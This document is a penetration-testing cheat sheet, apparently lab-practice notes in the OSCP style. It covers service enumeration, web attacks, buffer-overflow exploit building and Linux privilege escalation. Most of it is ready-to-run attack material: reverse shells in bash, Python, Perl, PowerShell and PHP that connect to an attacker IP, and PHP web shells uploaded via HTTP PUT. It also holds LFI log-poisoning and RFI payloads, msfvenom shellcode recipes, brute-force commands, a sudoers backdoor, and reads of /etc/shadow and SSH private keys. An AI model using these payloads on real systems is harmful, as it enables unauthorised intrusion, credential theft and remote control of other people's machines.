# www.0daysecurity.com

## Table of Contents

* [**Recon**]()
  * [Enumeration AIO]()
  * [Port 21 - FTP]()
  * [Port 22 - SSH]()
  * [Port 25 - Telnet]()
  * [Port 69 - UDP - TFTP]()
  * [Kerberos - 88]()
  * [Port 110 - Pop3]()
  * [Port 111 - Rpcbind]()
  * [Port 135 - MSRPC]()
  * [Port 139/445 - SMB]()
  * [Port 161/162 UDP - SNMP]()
  * [LDAP - 389,636]()
  * [HTTPS - 443]()
  * [500 - ISAKMP IKE]()
  * [Port 554 - RTSP]()
  * [Port 1030/1032/1033/1038]()
  * [MSSQL - 1433]()
  * [Port 1521 - Oracle]()
  * [Port 2049 - NFS]()
  * [Port 2100 - Oracle XML DB]()
  * [3306 - MySQL]()
  * [Port 3339 - Oracle web interface]()
  * [RDP - 3389]()
  * [VNC - 5900]()
  * [Webdav]()
  * [Unknown ports]()
  * [Port 80 - Web server]()
    * [Url brute force]()
    * [Default/Weak login]()
    * [LFI/RFI]()
    * [SQL-Injection]()
    * [XSS]()
    * [Sql-login-bypass]()
  * [Password brute force - last resort]()
* [**Vulnerability analysis**]()
  * [BOF]()
  * [Find xploits - Searchsploit and google]()
  * [Reverse Shells]()
* [**Privilege escalation**]()
  * [Common]()
    * [Set up Webserver]()
    * [Set up FTP Server]()
    * [Set up TFTP]()
  * [Linux]()
    * [Useful commands]()
    * [Basic info]()
    * [Kernel exploits]()
    * [Programs running as root]()
    * [Installed software]()
    * [Weak/reused/plaintext passwords]()
    * [Inside service]()
    * [Suid misconfiguration]()
    * [Unmounted filesystems]()
    * [Cronjob]()
    * [SSH Keys]()
    * [Bad path configuration]()
    * [Find plain passwords]()
    * [Scripts]()
      * [SUID]()
      * [PS Monitor for cron]()
    * [Linux Privesc Tools]()
  * [Windows]()
    * [Basic info]()
    * [Kernel exploits]()
    * [Cleartext passwords]()
    * [Reconfigure service parameters]()
    * [Inside service]()
    * [Programs running as root/system]()
    * [Installed software]()
    * [Scheduled tasks]()
    * [Weak passwords]()
    * [Add user and enable RDP]()
    * [Powershell sudo for Windows]()
    * [Windows download with bitsadmin]()
    * [Windows download with certutil.exe]()
    * [Windows download with powershell]()
    * [Windows Download from FTP]()
    * [Windows create SMB Server transfer files]()
    * [Windows download with VBS]()
    * [Windowss XP SP1 PrivEsc]()
    * [Pass The Hash]()
    * [Scripts]()
      * [Useradd]()
      * [Powershell Run As]()
    * [Windows privesc/enum tools]()
    * [Windows precompiled Scripts]()
* [**Loot**]()
  * [Linux]()
    * [Proof]()
    * [Network secret]()
    * [Passwords and hashes]()
    * [Dualhomed]()
    * [Tcpdump]()
    * [Interesting files]()
    * [Databases]()
    * [SSH-Keys]()
    * [Browser]()
    * [Mail]()
    * [GUI]()
  * [Windows]()
    * [Proof]()
    * [Passwords and hashes]()
    * [Dualhomed]()
    * [Tcpdump]()
    * [Interesting files]()

## **Recon**

```text
# Enumerate subnet
nmap -sn 10.11.1.1/24

# Fast simple scan
nmap -sS 10.11.1.111

# Full complete slow scan with output
nmap -sT -sC -sV -A -T4 -p- -O -A -Pn --script vuln -oA full 10.11.1.111

# Autorecon
python3 autorecon.py 10.11.1.111

# OneTwoPunch
https://raw.githubusercontent.com/superkojiman/onetwopunch/master/onetwopunch.sh
onetwopunch.sh ip.txt tcp

# Scan for UDP
nmap 10.11.1.111 -sU
unicornscan -mU -v -I 10.11.1.111

# Connect to udp if one is open
nc -u 10.11.1.111 48772
```

* sparta
* `python /root/Reconnoitre/Reconnoitre/reconnoitre.py -t 10.11.1.111 -o test --services`

### Enumeration AIO

[Penetration Testing Methodology - 0DAYsecurity.com](http://0daysecurity.com/penetration-testing/enumeration.html)

### Port 21 - FTP

```text
nmap --script ftp-anon,ftp-bounce,ftp-libopie,ftp-proftpd-backdoor,ftp-vsftpd-backdoor,ftp-vuln-cve2010-4221,tftp-enum -p 21 10.11.1.111
```

### Port 22 - SSH

* If you have usernames test login with username:username
* Vulnerable Versions: 7.2p1

```text
nc 10.11.1.111 22
```

### Port 25 - Telnet

```text
nc -nvv 10.11.1.111 25
HELO foo<cr><lf>

telnet 10.11.1.111 25
VRFY root

nmap --script=smtp-commands,smtp-enum-users,smtp-vuln-cve2010-4344,smtp-vuln-cve2011-1720,smtp-vuln-cve2011-1764 -p 25 10.11.1.111
smtp-user-enum -M VRFY -U /root/sectools/SecLists/Usernames/Names/names.txt -t 10.11.1.111
```

### Port 69 - UDP - TFTP

This is used for tftp-server.

* Vulns tftp in server 1.3, 1.4, 1.9, 2.1, and a few more.
* Checks of FTP Port 21.

```text
nmap -p69 --script=tftp-enum.nse 10.11.1.111
```

### Kerberos - 88

* MS14-068
* GetUserSPNs

### Port 110 - Pop3

```text
telnet 10.11.1.111
USER pelle@10.11.1.111
PASS admin

or:

USER pelle
PASS admin

# List all emails
list

# Retrieve email number 5, for example
retr 9
```

### Port 111 - Rpcbind

```text
rpcinfo -p 10.11.1.111
rpcclient -U "" 10.11.1.111
    srvinfo
    enumdomusers
    getdompwinfo
    querydominfo
    netshareenum
    netshareenumall
```

### Port 135 - MSRPC

Some versions are vulnerable.

```text
nmap 10.11.1.111 --script=msrpc-enum
msf > use exploit/windows/dcerpc/ms03_026_dcom
```

### Port 139/445 - SMB

```text
nmap --script smb-enum-*,smb-vuln-*,smb-ls.nse,smb-mbenum.nse,smb-os-discovery.nse,smb-print-text.nse,smb-psexec.nse,smb-security-mode.nse,smb-server-stats.nse,smb-system-info.nse,smb-protocols -p 139,445 10.11.1.111

nmap --script smb-enum-domains.nse,smb-enum-groups.nse,smb-enum-processes.nse,smb-enum-sessions.nse,smb-enum-shares.nse,smb-enum-users.nse,smb-ls.nse,smb-mbenum.nse,smb-os-discovery.nse,smb-print-text.nse,smb-psexec.nse,smb-security-mode.nse,smb-server-stats.nse,smb-system-info.nse,smb-vuln-conficker.nse,smb-vuln-cve2009-3103.nse,smb-vuln-ms06-025.nse,smb-vuln-ms07-029.nse,smb-vuln-ms08-067.nse,smb-vuln-ms10-054.nse,smb-vuln-ms10-061.nse,smb-vuln-regsvc-dos.nse -p 139,445 10.11.1.111

enum4linux -a 10.11.1.111

rpcclient -U "" 10.11.1.111
    srvinfo
    enumdomusers
    getdompwinfo
    querydominfo
    netshareenum
    netshareenumall

smbclient -L 10.11.1.111
smbclient //10.11.1.111/tmp
smbclient \\\\10.11.1.111\\ipc$ -U john
smbclient //10.11.1.111/ipc$ -U john  

winexe -U username //10.11.1.111 "cmd.exe" --system

smbtree 10.11.1.111

nmblookup -A target

smbmap -u victim -p s3cr3t -H 10.11.1.111

dentro de \Policies\{REG}\MACHINE\Preferences\Groups\Groups.xml está el usuario y la contraseña que se puede desencriptar con "gpp-decrypt "
```

### Port 161/162 UDP - SNMP

```text
nmap -vv -sV -sU -Pn -p 161,162 --script=snmp-netstat,snmp-processes 10.11.1.111
snmp-check 10.11.1.111 -c public|private|community
```

### LDAP - 389,636

```text
ldapsearch -h 10.11.1.111 -p 389 -x -b "dc=mywebsite,dc=com"
```

### HTTPS - 443

Read the actual SSL CERT to:

* find out potential correct vhost to GET
* is the clock skewed
* any names that could be usernames for bruteforce/guessing.

```text
sslscan 10.11.1.111:443
./testssl.sh -e -E -f -p  -S -P -c -H -U TARGET-HOST > OUTPUT-FILE.html
nmap -sV --script=ssl-heartbleed 192.168.101.8
mod_ssl,OpenSSL version Openfuck
```

### 500 - ISAKMP IKE

```text
ike-scan 10.11.1.111
```

### Port 554 - RTSP

* Web interface, transfer images, streaming

### Port 1030/1032/1033/1038

Used by RPC to connect in domain network.

### MSSQL - 1433

```text
nmap -p 1433 -sU --script=ms-sql-info.nse 10.11.1.111
use auxiliary/scanner/mssql/mssql_ping
use auxiliary/scanner/mssql/mssql_login
use exploit/windows/mssql/mssql_payload
sqsh -S 10.11.1.111 -U sa
    xp_cmdshell 'date'
      go
```

### Port 1521 - Oracle

```text
oscanner -s 10.11.1.111 -P 1521
tnscmd10g version -h 10.11.1.111
tnscmd10g status -h 10.11.1.111
nmap -p 1521 -A 10.11.1.111
nmap -p 1521 --script=oracle-tns-version,oracle-sid-brute,oracle-brute
MSF: good modules under auxiliary/admin/oracle and scanner/oracle

./odat-libc2.5-i686 all -s 10.11.1.111 -p 1521
./odat-libc2.5-i686 sidguesser -s 10.11.1.111 -p 1521
./odat-libc2.5-i686 passwordguesser -s 10.11.1.111 -p 1521 -d XE

Upload reverse shell with ODAT:
./odat-libc2.5-i686 utlfile -s 10.11.1.111 -p 1521 -U scott -P tiger -d XE --sysdba --putFile c:/ shell.exe /root/shell.exe

and run it:
./odat-libc2.5-i686 externaltable -s 10.11.1.111 -p 1521 -U scott -P tiger -d XE --sysdba --exec c:/ shell.exe
```

### Port 2049 - NFS

```text
showmount -e 10.11.1.111

If you find anything you can mount it like this:

mount 10.11.1.111:/ /tmp/NFS
mount -t 10.11.1.111:/ /tmp/NFS
```

### Port 2100 - Oracle XML DB

```text
FTP:
    sys:sys
    scott:tiger
```

Default passwords [https://docs.oracle.com/cd/B10501\_01/win.920/a95490/username.htm](https://docs.oracle.com/cd/B10501_01/win.920/a95490/username.htm)

### 3306 - MySQL

```text
nmap --script=mysql-databases.nse,mysql-empty-password.nse,mysql-enum.nse,mysql-info.nse,mysql-variables.nse,mysql-vuln-cve2012-2122.nse 10.11.1.111 -p 3306

mysql --host=10.11.1.111 -u root -p

MYSQL UDF 
https://www.adampalmer.me/iodigitalsec/2013/08/13/mysql-root-to-system-root-with-udf-for-windows-and-linux/
```

### Port 3339 - Oracle web interface

* Basic info about web service \(apache, nginx, IIS\)

### RDP - 3389

```text
nmap -p 3389 --script=rdp-vuln-ms12-020.nse
rdesktop -u username -p password -g 85% -r disk:share=/root/ 10.11.1.111
rdesktop -u guest -p guest 10.11.1.111 -g 94%
ncrack -vv --user Administrator -P /root/oscp/passwords.txt rdp://10.11.1.111
```

### WinRM - 5985

```text
https://github.com/Hackplayers/evil-winrm
./evil-winrm.rb -i 10.11.1.111 -u Administrator -p 'password1'
```

### VNC - 5900

```text
nmap --script=vnc-info,vnc-brute,vnc-title -p 5900 10.11.1.111
```

### Webdav

```text
davtest -cleanup -url http://target
cadaver http://target
```

### Unknown ports

* `amap -d 10.11.1.111 8000`
* netcat: makes connections to ports. Can echo strings or give shells: `nc -nv 10.11.1.111 110`
* sfuzz: can connect to ports, udp or tcp, refrain from closing a connection,     using basic HTTP configurations
* Try zone transfer for subdomains: `dig axfr @10.11.1.111 hostname.box`, `dnsenum 10.11.1.111`, `dnsrecon -d domain.com -t axfr`

Try admin:admin, user:user

### Port 80 - Web server

* Basics:
  * Navigate && robots.txt
  * Headers
  * Source Code

```text
# Nikto
nikto -h http://10.11.1.111

# Nikto with squid proxy
nikto -h 10.11.1.111 -useproxy http://10.11.1.111:4444

# CMS Explorer
cms-explorer -url http://10.11.1.111 -type [Drupal, WordPress, Joomla, Mambo]

# WPScan (vp = Vulnerable Plugins, vt = Vulnerable Themes, u = Users)
wpscan --url http://10.11.1.111
wpscan --url http://10.11.1.111 --enumerate vp
wpscan --url http://10.11.1.111 --enumerate vt
wpscan --url http://10.11.1.111 --enumerate u

# Joomscan
joomscan -u  http://10.11.1.111 
joomscan -u  http://10.11.1.111 --enumerate-components

# Get header
curl -i 10.11.1.111

# Get options
curl -i -X OPTIONS 10.11.1.111

    # With PUT option enabled:

    nmap -p 80 192.168.1.124 --script http-put --script-args http-put.url='/test/rootme.php',http-put.file='/root/php-reverse-shell.php'

    curl -v -X PUT -d '<?php system($_GET["cmd"]);?>' http://192.168.1.124/test/cmd.php
    && http://192.168.1.124/test/cmd.php?cmd=python%20-c%20%27import%20socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((%22192.168.1.110%22,443));os.dup2(s.fileno(),0);%20os.dup2(s.fileno(),1);%20os.dup2(s.fileno(),2);p=subprocess.call([%22/bin/sh%22,%22-i%22]);%27

# Get everything
curl -i -L 10.11.1.111
curl -i -H "User-Agent:Mozilla/4.0" http://10.11.1.111:8080

# Check for title and all links
curl 10.11.1.111 -s -L | grep "title\|href" | sed -e 's/^[[:space:]]*//'

# Look at page with just text
curl 10.11.1.111 -s -L | html2text -width '99' | uniq

# Check if it is possible to upload
curl -v -X OPTIONS http://10.11.1.111/
curl -v -X PUT -d '<?php system($_GET["cmd"]); ?>' http://10.11.1.111/test/shell.php

# Simple curl POST request with login data
curl -X POST http://10.11.1.11/centreon/api/index.php?action=authenticate -d 'username=centreon&password=wall'

dotdotpwn.pl -m http -h 10.11.1.111 -M GET -o unix
```

#### Url brute force

```text
# Dirb not recursive
dirb http://10.11.1.111 -r -o dirb-10.11.1.111.txt

# Wfuzz
wfuzz -c -z file,/usr/share/wfuzz/wordlist/general/common.txt --hc 404 http://10.11.1.8/FUZZ

# GoBuster
gobuster dir -u http://10.11.1.111 -w /usr/share/seclists/Discovery/Web_Content/common.txt -s '200,204,301,302,307,403,500' -e
gobuster dir -e -u http://10.11.1.111/ -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
gobuster dir -u http://$10.11.1.111 -w /usr/share/seclists/Discovery/Web_Content/Top1000-RobotsDisallowed.txt
gobuster dir -e -u http://10.11.1.111/ -w /usr/share/wordlists/dirb/common.txt

dotdotpwn.pl -m http -h 10.11.1.111 -M GET -o unix

./dirsearch.py -u 10.10.10.157 -e php

medusa -h 10.11.1.111 -u admin -P wordlist.txt -M http -m DIR:/test -T 10
```

#### Default/Weak login

Search documentation for default passwords and test them

```text
site:webapplication.com password
```

```text
admin admin
admin password
admin <blank>
admin <servicename>
root root
root admin
root password
root <servicename>
<username if you have> password
<username if you have> admin
<username if you have> username
username <servicename>
```

#### LFI/RFI

```text
fimap -u "http://10.11.1.111/example.php?test="

# Ordered output
curl -s http://10.11.1.111/gallery.php?page=/etc/passwd
/root/Tools/Kadimus/kadimus -u http://10.11.1.111/example.php?page=

http://10.11.1.111/index.php?page=php://filter/convert.base64-encode/resource=/etc/passwd && base64 -d savefile.php
http://10.11.1.111/page=http://10.11.1.111/maliciousfile.txt%00 or ?
?page=php://filter/convert.base64-encode/resource=../config.php
../../../../../boot.ini

amap -d 10.11.1.111 8000

# LFI Windows
http://10.11.1.111/addguestbook.php?LANG=../../windows/system32/drivers/etc/hosts%00

# Contaminating log files
root@kali:~# nc -v 10.11.1.111 80
10.11.1.111: inverse host lookup failed: Unknown host
(UNKNOWN) [10.11.1.111] 80 (http) open
 <?php echo shell_exec($_GET['cmd']);?> 

http://10.11.1.111/addguestbook.php?LANG=../../xampp/apache/logs/access.log%00&cmd=ipconfig

# RFI:
http://10.11.1.111/addguestbook.php?LANG=http://10.11.1.111:31/evil.txt%00
Content of evil.txt:
<?php echo shell_exec("nc.exe 10.11.0.105 4444 -e cmd.exe") ?>

# PHP Filter:
http://10.11.1.111/index.php?m=php://filter/convert.base64-encode/resource=config
```

#### SQL-Injection

```text
# References
https://www.exploit-db.com/papers/17934
https://pentestlab.blog/2012/12/24/sql-injection-authentication-bypass-cheat-sheet/

# Post
./sqlmap.py -r search-test.txt -p tfUPass

# Get
sqlmap -u "http://10.11.1.111/index.php?id=1" --dbms=mysql

# Crawl
sqlmap -u http://10.11.1.111 --dbms=mysql --crawl=3

# Full auto - THE GOOD ONE
sqlmap -u 'http://10.11.1.111:1337/978345210/index.php' --forms --dbs --risk=3 --level=5 --threads=4 --batch
# Columns 
sqlmap -u 'http://admin.cronos.htb/index.php' --forms --dbms=MySQL --risk=3 --level=5 --threads=4 --batch --columns -T users -D admin
# Values
sqlmap -u 'http://admin.cronos.htb/index.php' --forms --dbms=MySQL --risk=3 --level=5 --threads=4 --batch --dump -T users -D admin

sqlmap -o -u "http://10.11.1.111:1337/978345210/index.php" --data="username=admin&password=pass&submit=+Login+" --method=POST --level=3 --threads=10 --dbms=MySQL --users --passwords
```

#### XSS

```text
<script>alert("XSS")</script>
```

#### Sql-login-bypass

* Open Burp-suite
* Make and intercept a request
* Send to intruder
* Cluster attack.
* Paste in sqlibypass-list \([https://bobloblaw.gitbooks.io/security/content/sql-injections.html](https://bobloblaw.gitbooks.io/security/content/sql-injections.html)\)
* Attack
* Check for response length variation

#### Bypass image upload restrictions

```text
- Change extension: .pHp3 or pHp3.jpg
- Modify mimetype: Content-type: image/jpeg
- Bypass getimagesize(): exiftool -Comment='<?php echo "<pre>"; system($_GET['cmd']); ?>' file.jpg
- Add gif header: GIF89a;
- All at the same time.
```

### Password brute force - last resort

Offline local resources

```text
cewl
hash-identifier
john --rules --wordlist=/usr/share/wordlists/rockyou.txt unshadowed.txt
medusa -h 10.11.1.111 -u admin -P password-file.txt -M http -m DIR:/admin -T 10
ncrack -vv --user offsec -P password-file.txt rdp://10.11.1.111
crowbar -b rdp -s 10.11.1.111/32 -u victim -C /root/words.txt -n 1
hydra -l root -P password-file.txt 10.11.1.111 ssh
hydra -P password-file.txt -v 10.11.1.111 snmp
hydra -l USERNAME -P /usr/share/wordlistsnmap.lst -f 10.11.1.111 ftp -V
hydra -l USERNAME -P /usr/share/wordlistsnmap.lst -f 10.11.1.111 pop3 -V
hydra -P /usr/share/wordlistsnmap.lst 10.11.1.111 smtp -V

# SIMPLE LOGIN GET
hydra -L cewl_fin_50.txt -P cewl_fin_50.txt 10.11.1.111 http-get-form "/~login:username=^USER^&password=^PASS^&Login=Login:Unauthorized" -V

# SIMPLE LOGIN POST
hydra -l root@localhost -P cewl 10.11.1.111 http-post-form "/otrs/index.pl:Action=Login&RequestedURL=&Lang=en&TimeOffset=-120&User=^USER^&Password=^PASS^:F=Login failed" -I

# API REST LOGIN POST
hydra -l admin -P /usr/share/wordlists/wfuzz/others/common_pass.txt -V -s 80 10.11.1.111 http-post-form "/centreon/api/index.php?action=authenticate:username=^USER^&password=^PASS^:Bad credentials" -t 64
```

Online crackers

```text
https://hashkiller.co.uk/Cracker
https://www.cmd5.org/
https://www.onlinehashcrack.com/
https://gpuhash.me/
https://crackstation.net/
https://crack.sh/
https://hash.help/
https://passwordrecovery.io/
http://cracker.offensive-security.com/
```

## **Vulnerability analysis**

### BOF

```text
# BASIC GUIDE
1. Send "A"*1024
2. Replace "A" with /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l LENGTH
3. When crash "!mona findmsp" (E10.11.1.111 offset) or ""/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q TEXT" or "!mona pattern_offset eip"
4. Confirm the location with "B" and "C"
5. Check for badchars instead CCCC (ESP):
badchars = ("\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10" "\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20" "\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30" "\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40" "\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50" "\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60" "\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70" "\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80" "\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90" "\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0" "\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0" "\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0" "\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0" "\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0" "\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0" "\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff")
with script _badchars.py and 
"!mona compare -a esp -f C:\Users\IEUser\Desktop\badchar_test.bin"
    5.1 AWESOME WAY TO CHECK BADCHARS (https://bulbsecurity.com/finding-bad-characters-with-immunity-debugger-and-mona-py/):
        a. !mona config -set workingfolder c:\logs\%p
        b. !mona bytearray -b "\x00\x0d"
        c. Copiar de c:\logs\%p\bytearray.txt al script y ejecutar de nuevo
        d. !mona compare -f C:\logs\%p\bytearray.bin -a 02F238D0 (ESP address)
        e. In " data", before unicode chars it shows badchars.
 6. Find JMP ESP with "!mona modules" or "!mona jmp -r esp" or "!mona jmp -r esp -cpb '\x00\x0a\x0d'" find one with security modules "FALSE"

    6.1 Then, "!mona find -s "\xff\xe4" -m PROGRAM/DLL-FALSE"
    6.2 Remember put the JMP ESP location in reverse order due to endianness: 5F4A358F will be \x8f\x35\x4a\x5f


7. Generate shellcode and place it:
msfvenom -p windows/shell_reverse_tcp LHOST=10.11.1.111 LPORT=4433 -f python –e x86/shikata_ga_nai -b "\x00"

msfvenom -p windows/shell_reverse_tcp lhost=10.11.1.111 lport=443 EXITFUNC=thread -a x86 --platform windows -b "\x00\x0a\x0d" -e x86/shikata_ga_nai -f python -v shellcode

8. Final buffer like:
buffer="A"*2606 + "\x8f\x35\x4a\x5f" + "\x90" * 8 + shellcode
```

```text
################ sample 1 ################################################
#!/usr/bin/python

import socket,sys

if len(sys.argv) != 3:
    print("usage: python fuzzer.py 10.11.1.111 PORT")
    exit(1)

payload = "A" * 1000

ipAddress = sys.argv[1]
port = int(sys.argv[2])

try:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((ipAddress, port))
    s.recv(1024)
    print "Sending payload"
    s.send(payload)
    print "Done"
    s.close()
except:
    print "Error"
    sys.exit(0)

################ sample 2 ################################################
#!/usr/bin/python
import time, struct, sys
import socket as so

try:
    server = sys.argv[1]
    port = 5555
except IndexError:
    print "[+] Usage %s host" % sys.argv[0]
    sys.exit()

req1 = "AUTH " + "\x41"*1072
s = so.socket(so.AF_INET, so.SOCK_STREAM)
try:
     s.connect((server, port))
     print repr(s.recv(1024))
     s.send(req1)
     print repr(s.recv(1024))
except:
     print "[!] connection refused, check debugger"
s.close()
```

### Find xploits - Searchsploit and google

Where there are many exploits for a software, use google. It will automatically sort it by popularity.

```bash
site:exploit-db.com apache 2.4.7

# Remove dos-exploits

searchsploit Apache 2.4.7 | grep -v '/dos/'
searchsploit Apache | grep -v '/dos/' | grep -vi "tomcat"

# Only search the title (exclude the path), add the -t
searchsploit -t Apache | grep -v '/dos/'
```

### Reverse Shells

```bash
# Linux 
bash -i >& /dev/tcp/10.11.1.111/4443 0>&1
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.11.1.111 4443 >/tmp/f
nc -e /bin/sh 10.11.1.111 4443

# Python
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.11.1.111",4443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

__import__('os').system('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.9 4433 >/tmp/f')-1\

# Perl
perl -e 'use Socket;$i="10.11.1.111";$p=4443;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'

# Windows
nc -e cmd.exe 10.11.1.111 4443
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.11',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"

# PHP most simple Linux
<?php $sock = fsockopen("10.11.1.111",1234); $proc = proc_open("/bin/sh -i", array(0=>$sock, 1=>$sock, 2=>$sock), $pipes);?>
```

## **Privilege escalation**

### Common

#### Set up Webserver

```text
python -m SimpleHTTPServer 8080
```

#### Set up FTP Server

```text
# Install pyftpdlib
pip install pyftpdlib

# Run (-w flag allows anonymous write access)
python -m pyftpdlib -p 21 -w
```

#### Set up TFTP

```text
# In Kali
atftpd --daemon --port 69 /tftp

# In reverse Windows
tftp -i 10.11.1.111 GET nc.exe
nc.exe -e cmd.exe 10.11.1.111 4444

http://10.11.1.111/addguestbook.php?LANG=../../xampp/apache/logs/access.log%00&cmd=nc.exe%20-e%20cmd.exe%2010.11.0.105%204444
```

### Linux

Now we start the whole enumeration-process over gain.

* Kernel exploits
* Programs running as root
* Installed software
* Weak/reused/plaintext passwords
* Inside service
* Suid misconfiguration
* World writable scripts invoked by root
* Unmounted filesystems
* Look in /var/backups
* Look in /etc/fstab y en mount

Less likely

* Private ssh keys
* Bad path configuration
* Cronjobs

#### Useful commands

```text
# Spawning shell
python -c 'import pty; pty.spawn("/bin/bash")'
python -c 'import pty; pty.spawn("/bin/sh")'
V
Ctrl+Z
stty raw -echo
fg
reset
Ctrl+Z
stty size
stty -rows 48 -columns 120
fg

echo os.system('/bin/bash')
/bin/sh -i
perl -e 'exec "/bin/sh";'
perl: exec "/bin/sh";
ruby: exec "/bin/sh"
lua: os.execute('/bin/sh')
(From within vi)
:!bash
:set shell=/bin/bash:shell
(From within nmap)
!sh

# Access to more binaries
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin

# Set up webserver
cd /root/oscp/useful-tools/privesc/linux/privesc-scripts; python -m SimpleHTTPServer 8080

# Download all files
wget http://10.11.1.111:8080/ -r; mv 10.11.1.111:8080 exploits; cd exploits; rm index.html; chmod 700 LinEnum.sh linprivchecker.py unix-privesc-check

./LinEnum.sh -t -k password -r LinEnum.txt
python linprivchecker.py extended
./unix-privesc-check standard

# Writable directories
/tmp
/var/tmp

# Add user to sudoers
useradd hacker
passwd hacker
echo "hacker ALL=(ALL:ALL) ALL" >> /etc/sudoers
```

#### Basic info

```text
uname -a
env
id
cat /proc/version
cat /etc/issue
cat /etc/passwd
cat /etc/group
cat /etc/shadow
cat /etc/hosts

# Users with login
grep -vE "nologin" /etc/passwd

# Priv Enumeration Scripts
upload /unix-privesc-check
upload /root/Desktop/Backup/Tools/Linux_privesc_tools/linuxprivchecker.py ./
upload /root/Desktop/Backup/Tools/Linux_privesc_tools/LinEnum.sh ./

python linprivchecker.py extended
./LinEnum.sh -t -k password
unix-privesc-check
```

#### Kernel exploits

```text
site:exploit-db.com kernel version

perl /root/oscp/useful-tools/privesc/linux/Linux_Exploit_Suggester/Linux_Exploit_Suggester.pl -k 2.6

python linprivchecker.py extended
```

#### Programs running as root

Look for webserver, mysql or anything else like that.

```text
# Metasploit
ps

# Linux
ps aux
```

#### Installed software

```text
/usr/local/
/usr/local/src
/usr/local/bin
/opt/
/home
/var/
/usr/src/

# Debian
dpkg -l

# CentOS, OpenSuse, Fedora, RHEL
rpm -qa (CentOS / openSUSE )

# OpenBSD, FreeBSD
pkg_info
```

#### Weak/reused/plaintext passwords

* Check database config-file
* Check databases
* Check weak passwords

```text
username:username
username:username1
username:root
username:admin
username:qwerty
username:password
```

* Check plaintext

```text
./LinEnum.sh -t -k password
```

#### Inside service

```text
# Linux
netstat -anlp
netstat -ano
```

#### Suid misconfiguration

Binary with suid permission can be run by anyone, but when they are run they are run as root!

Example programs:

```text
nmap
vim
nano
```

```text
# SUID
find / -perm -4000 -type f 2>/dev/null

# ALL PERMS
find / -perm -777 -type f 2>/dev/null

# SUID for current user
find / perm /u=s -user `whoami` 2>/dev/null
find / -user root -perm -4000 -print 2>/dev/null

# Writables for current user/group
find / perm /u=w -user `whoami` 2>/dev/null
find / -perm /u+w,g+w -f -user `whoami` 2>/dev/null
find / -perm /u+w -user `whoami` 2>/dev/nul

# Dirs with +w perms for current u/g
find / perm /u=w -type -d -user `whoami` 2>/dev/null
find / -perm /u+w,g+w -d -user `whoami` 2>/dev/null
```

#### Unmounted filesystems

Here we are looking for any unmounted filesystems. If we find one we mount it and start the priv-esc process over again.

```text
mount -l
```

#### Cronjob

Look for anything that is owned by privileged user but writable for you

```text
crontab -l
ls -alh /var/spool/cron
ls -al /etc/ | grep cron
ls -al /etc/cron*
cat /etc/cron*
cat /etc/at.allow
cat /etc/at.deny
cat /etc/cron.allow
cat /etc/cron.deny
cat /etc/crontab
cat /etc/anacrontab
cat /var/spool/cron/crontabs/root
```

#### SSH Keys

Check all home directories

```text
cat ~/.ssh/authorized_keys
cat ~/.ssh/identity.pub
cat ~/.ssh/identity
cat ~/.ssh/id_rsa.pub
cat ~/.ssh/id_rsa
cat ~/.ssh/id_dsa.pub
cat ~/.ssh/id_dsa
cat /etc/ssh/ssh_config
cat /etc/ssh/sshd_config
cat /etc/ssh/ssh_host_dsa_key.pub
cat /etc/ssh/ssh_host_dsa_key
cat /etc/ssh/ssh_host_rsa_key.pub
cat /etc/ssh/ssh_host_rsa_key
cat /etc/ssh/ssh_host_key.pub
cat /etc/ssh/ssh_host_key
```
